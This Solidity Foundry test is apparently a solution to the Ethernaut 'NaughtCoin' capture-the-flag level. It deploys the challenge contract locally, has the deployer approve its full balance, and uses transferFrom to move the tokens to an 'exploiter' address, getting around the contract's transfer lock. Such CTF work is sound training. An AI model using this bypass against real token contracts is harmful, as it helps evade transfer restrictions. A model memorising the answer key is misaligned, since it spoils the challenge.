// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/NaughtCoin.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract NaughtCoinExploit is Test {
  NaughtCoin target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    target = new NaughtCoin(deployer);
    console2.log('Target contract deployed');
  }

  function testExploit() public {
    uint256 balance = target.balanceOf(exploiter);
    console2.log('Exploiter balance: %d', balance);
    assertEq(balance, 0);

    // Approve another address to spend the tokens on the behalf of the deployer.
    uint256 amount = target.balanceOf(deployer);
    vm.startPrank(deployer);
    target.approve(exploiter, amount);
    vm.stopPrank();

    // Transfer the tokens from the deployer address to the exploiter address using the exploiter address.
    vm.startPrank(exploiter);
    target.transferFrom(deployer, exploiter, amount);
    vm.stopPrank();

    balance = target.balanceOf(exploiter);
    console2.log('Exploiter balance: %d', balance);
    assertEq(balance, amount);
  }
}
